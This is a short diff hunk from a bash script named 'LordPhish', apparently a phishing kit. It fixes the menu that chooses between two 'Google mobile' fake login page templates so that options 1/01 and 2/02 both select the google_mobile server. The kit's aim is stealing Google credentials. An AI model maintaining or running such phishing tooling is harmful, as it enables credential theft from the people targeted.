@@ -610,11 +610,11 @@ list_gm() {
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Google mobile2\e[0m\n"
     read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
-if [[ $option == 1 ]]; then
+if [[ $option == 1 || $option == 01 ]]; then
 server="google_mobile"
 start1
     
-elif [[ $option == 3 || $option == 03 ]]; then
+elif [[ $option == 2 || $option == 02 ]]; then
 server="google_mobile"
 start1
 
